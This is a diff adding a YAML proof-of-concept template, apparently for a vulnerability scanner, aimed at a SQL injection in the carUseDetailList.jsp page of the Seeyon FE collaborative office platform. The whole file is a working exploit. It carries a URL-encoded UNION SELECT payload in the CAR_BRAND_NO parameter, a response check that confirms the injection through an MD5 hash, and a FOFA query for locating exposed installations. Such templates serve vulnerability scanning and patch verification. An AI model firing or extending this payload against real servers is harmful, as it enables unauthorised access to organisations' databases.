@@ -1,0 +1,18 @@
+id: poc-yaml-seeyon-hulian-fe-carusedetaillist-sqli
+info:
+  name: 致远互联FE协作办公平台 carUseDetailList SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 致远互联-FE
+  fofa: app="致远互联-FE"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /carManager/carUseDetailList.jsp?CAR_BRAND_NO=1%27+UNION+ALL+SELECT+NULL%2Csys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+sFii
+  expression: status_code == 200 && (contains(body,"车辆使用情况") || contains(gbk_decode(body),"车辆使用情况"))
+    && (contains(body,"车牌号码") || contains(gbk_decode(body),"车牌号码")) && contains(body,"0X"
+    + t2)
+transport: http
